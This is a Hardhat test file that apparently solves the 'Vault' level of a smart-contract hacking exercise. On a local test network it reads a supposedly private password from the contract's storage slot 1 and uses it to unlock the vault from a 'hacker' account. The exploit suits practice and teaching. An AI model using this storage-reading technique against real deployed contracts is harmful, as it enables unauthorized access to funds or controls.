const { loadFixture, } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");
const { expect } = require("chai");
  
describe("Level08 - Valut", function () {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const VaultContract = await ethers.deployContract("Vault", [ethers.encodeBytes32String("password")]);
        const VaultAddress = await VaultContract.getAddress();
        
        return {owner, hacker, VaultContract, VaultAddress};
    };

    describe("Level08 hacking", () => {
        it("should unlock the vault by reading the password from storage", async() => {
            const {owner, hacker, VaultContract, VaultAddress} = await loadFixture(setUp);
            
            expect(await VaultContract.locked()).to.equal(true);
            const password = await ethers.provider.getStorage(await VaultContract.getAddress(), 1);
            
            await VaultContract.connect(hacker).unlock(password);
            expect(await VaultContract.locked()).to.equal(false);
        }); 

    })

});